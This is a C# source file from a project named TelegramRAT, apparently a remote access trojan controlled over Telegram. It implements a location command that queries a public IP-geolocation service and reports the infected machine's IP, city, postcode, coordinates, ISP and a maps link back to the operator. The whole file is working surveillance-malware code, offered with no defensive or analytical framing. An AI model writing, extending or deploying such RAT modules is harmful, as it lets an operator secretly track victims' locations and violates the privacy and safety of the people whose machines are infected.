namespace TelegramRAT.Commands;

using System.Text.Json;
using TelegramRAT.Models;

internal sealed class LocationCmd : IAsyncCommand
{
    private static readonly HttpClient Http = new() { Timeout = TimeSpan.FromSeconds(10) };

    public async Task<CommandResult> ExecuteAsync(string[] args)
    {
        var location = await GetLocationViaIpAsync();
        return CommandResult.Text(location);
    }

    private static async Task<string> GetLocationViaIpAsync()
    {
        try
        {
            var response = await Http.GetStringAsync("http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,query");
            var doc = JsonDocument.Parse(response);
            var root = doc.RootElement;

            if (root.GetProperty("status").GetString() != "success")
                return "Location lookup failed";

            var ip = root.GetProperty("query").GetString();
            var country = root.GetProperty("country").GetString();
            var region = root.GetProperty("regionName").GetString();
            var city = root.GetProperty("city").GetString();
            var zip = root.GetProperty("zip").GetString();
            var lat = root.GetProperty("lat").GetDouble();
            var lon = root.GetProperty("lon").GetDouble();
            var isp = root.GetProperty("isp").GetString();

            return $"IP: {ip}\nLocation: {city}, {region}, {country} {zip}\nCoords: {lat}, {lon}\nISP: {isp}\nMaps: https://maps.google.com/?q={lat},{lon}";
        }
        catch (Exception ex)
        {
            return $"Location lookup failed: {ex.Message}";
        }
    }
}
